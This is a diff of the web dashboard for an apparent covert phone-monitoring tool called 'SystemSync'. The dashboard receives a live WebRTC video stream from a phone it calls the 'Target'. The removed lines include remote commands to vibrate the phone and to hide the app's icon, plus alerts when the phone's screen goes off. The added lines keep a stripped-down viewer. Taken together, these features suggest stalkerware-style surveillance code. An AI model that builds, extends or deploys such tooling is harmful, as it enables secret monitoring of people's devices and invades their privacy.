@@ -2,73 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SystemSync - Remote Monitor</title>
+    <title>System Sync - Remote Monitor</title>
     <style>
-        body { background: #0f0f0f; color: #00ff00; font-family: monospace; text-align: center; margin: 0; }
-        #video-container { position: relative; width: 100%; max-width: 400px; margin: 20px auto; border: 2px solid #333; }
-        video { width: 100%; border-radius: 8px; background: #000; }
-        .controls { margin-top: 20px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
-        button { padding: 12px 20px; cursor: pointer; background: #222; color: #00ff00; border: 1px solid #00ff00; border-radius: 4px; }
-        button:hover { background: #00ff00; color: #000; }
-        #status { color: #888; margin-bottom: 10px; }
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; }
+        video { width: 80%; max-width: 400px; border: 2px solid #333; border-radius: 8px; margin-top: 20px; background: black; }
+        .status { color: #00ff00; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <h1>SYSTEM SYNC LIVE</h1>
-    <div id="status">Connecting to server...</div>
-    
-    <div id="video-container">
-        <video id="remoteVideo" autoplay playsinline></video>
-    </div>
-
-    <div class="controls">
-        <button onclick="startView()">▶ START VIEWING</button>
-        <button onclick="sendCommand('VIBRATE')">📳 VIBRATE</button>
-        <button onclick="sendCommand('HIDE_ICON')">👻 HIDE ICON</button>
-    </div>
+    <h2>Live Monitoring Dashboard</h2>
+    <div id="status" class="status">Waiting for phone...</div>
+    <video id="remoteVideo" autoplay playsinline controls></video>
 
     <script>
-        // REPLACE WITH YOUR RENDER URL (Must be wss://)
-        const SIGNAL_URL = "wss://mirror-view.onrender.com";
-        const ws = new WebSocket(SIGNAL_URL);
-        const pc = new RTCPeerConnection({
+        const remoteVideo = document.getElementById('remoteVideo');
+        const status = document.getElementById('status');
+        
+        // Replace with your Computer's Local IP address
+        const ws = new WebSocket('ws://localhost:8080');
+        const peerConnection = new RTCPeerConnection({
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
 
-        ws.onopen = () => document.getElementById('status').innerText = "ONLINE - Ready to Link";
-        
-        ws.onmessage = async (msg) => {
-            const data = JSON.parse(msg.data);
-            if (data.type === "answer") {
-                await pc.setRemoteDescription(new RTCSessionDescription(data));
-            } else if (data.candidate) {
-                await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
-            } else if (data.alert) {
-                alert("PHONE ALERT: " + data.alert); // Handles "Screen Off" or "Battery Low"
+        // When the phone sends video tracks, attach them to the video element
+        peerConnection.ontrack = (event) => {
+            status.innerText = "STREAMING LIVE";
+            remoteVideo.srcObject = event.streams[0];
+        };
+
+        ws.onmessage = async (message) => {
+            const data = JSON.parse(message.data);
+
+            if (data.sdp) {
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
+                if (data.sdp.type === 'offer') {
+                    const answer = await peerConnection.createAnswer();
+                    await peerConnection.setLocalDescription(answer);
+                    ws.send(JSON.stringify({ sdp: peerConnection.localDescription }));
+                }
+            } else if (data.ice) {
+                await peerConnection.addIceCandidate(new RTCIceCandidate(data.ice));
             }
         };
 
-        pc.onicecandidate = (event) => {
-            if (event.candidate) ws.send(JSON.stringify({ candidate: event.candidate }));
-        };
-
-        pc.ontrack = (event) => {
-            document.getElementById('remoteVideo').srcObject = event.streams[0];
-            document.getElementById('status').innerText = "STREAMING LIVE";
-        };
-
-        async function startView() {
-            const offer = await pc.createOffer({ offerToReceiveVideo: true });
-            await pc.setLocalDescription(offer);
-            ws.send(JSON.stringify({ type: "offer", sdp: offer.sdp }));
-            document.getElementById('status').innerText = "Requesting Stream...";
-        }
-
-        function sendCommand(cmd) {
-            ws.send(JSON.stringify({ command: cmd }));
-            console.log("Sent command: " + cmd);
-        }
+        // Handle connection to server
+        ws.onopen = () => { status.innerText = "Connected to Server. Waiting for Target..."; };
     </script>
 </body>
 </html>
